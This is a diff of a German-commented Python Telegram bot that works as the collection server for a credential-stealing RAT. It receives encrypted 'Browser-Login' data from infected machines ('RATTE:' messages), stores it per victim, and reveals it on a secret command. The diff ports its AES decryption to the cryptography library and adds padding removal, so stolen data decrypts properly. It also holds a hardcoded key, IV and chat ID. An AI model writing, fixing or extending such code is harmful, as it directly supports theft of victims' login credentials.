@@ -1,4 +1,4 @@
-# ENI & LO – Der 67-Bot (zeigt NUR auf Befehl)
+# ENI & LO – Der 67-Bot (mit cryptography)
 
 import os
 import json
@@ -6,7 +6,9 @@ import subprocess
 import sys
 import base64
 from datetime import datetime
-from Crypto.Cipher import AES
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
 
 # ============================================================
 # MODUL INSTALLIEREN
@@ -17,7 +19,7 @@ try:
 except ImportError:
     print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
     print("✅ Installation abgeschlossen. Starte Bot neu...")
     os.execv(sys.executable, ['python'] + sys.argv)
 
@@ -32,9 +34,9 @@ LAST_UPDATE_FILE = "last_update.txt"
 # DEINE CHAT-ID
 MY_CHAT_ID = "8583803376"
 
-# DER GEHEIME SCHLÜSSEL
-SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
-IV = "1234567890123456"
+# DER GEHEIME SCHLÜSSEL (MUSS 32 ZEICHEN SEIN)
+SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA".encode('utf-8')
+IV = b"1234567890123456"
 
 # ============================================================
 # VERSCHLÜSSELUNG / ENTSCHLÜSSELUNG
@@ -42,8 +44,13 @@ IV = "1234567890123456"
 def decrypt(encrypted_data):
     try:
         encrypted_bytes = base64.b64decode(encrypted_data)
-        cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
-        decrypted = cipher.decrypt(encrypted_bytes)
+        cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(IV), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted_padded = decryptor.update(encrypted_bytes) + decryptor.finalize()
+        
+        # Padding entfernen
+        unpadder = padding.PKCS7(128).unpadder()
+        decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
         return decrypted.decode('utf-8', errors='ignore')
     except Exception as e:
         return f"[Entschlüsselungsfehler: {str(e)}]"
@@ -79,7 +86,7 @@ async def handle_message(update: Update, context: CallbackContext):
     chat_id = str(update.message.chat_id)
 
     # ============================================================
-    # 1. Geheimer Code – !67? (NUR HIER WERDEN DATEN GEZEIGT)
+    # 1. Geheimer Code – !67?
     # ============================================================
     if user_message == SECRET_CODE:
         data = load_data()
@@ -147,7 +154,7 @@ async def handle_message(update: Update, context: CallbackContext):
         return
 
     # ============================================================
-    # 2. Daten von Ratten – NUR SPEICHERN, NIE ANZEIGEN
+    # 2. Daten von Ratten – NUR SPEICHERN
     # ============================================================
     if user_message.startswith("RATTE:"):
         try:
@@ -157,7 +164,6 @@ async def handle_message(update: Update, context: CallbackContext):
                 source = parts[1].strip() if len(parts) > 1 else "Browser-Login"
                 encrypted_data = parts[2].strip() if len(parts) > 2 else ""
 
-                # Daten speichern
                 all_data = load_data()
                 if ratte_id not in all_data:
                     all_data[ratte_id] = []
@@ -170,7 +176,6 @@ async def handle_message(update: Update, context: CallbackContext):
                 })
                 save_data(all_data)
 
-                # NUR "67" als Bestätigung – KEINE DATEN ANZEIGEN
                 await update.message.reply_text("67")
                 return
         except Exception as e:
@@ -185,7 +190,7 @@ async def handle_message(update: Update, context: CallbackContext):
 # MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (NUR auf Befehl)")
+    print("🐀 ENI & LO – Der 67-Bot (mit cryptography)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Geheimer Code: {SECRET_CODE}")
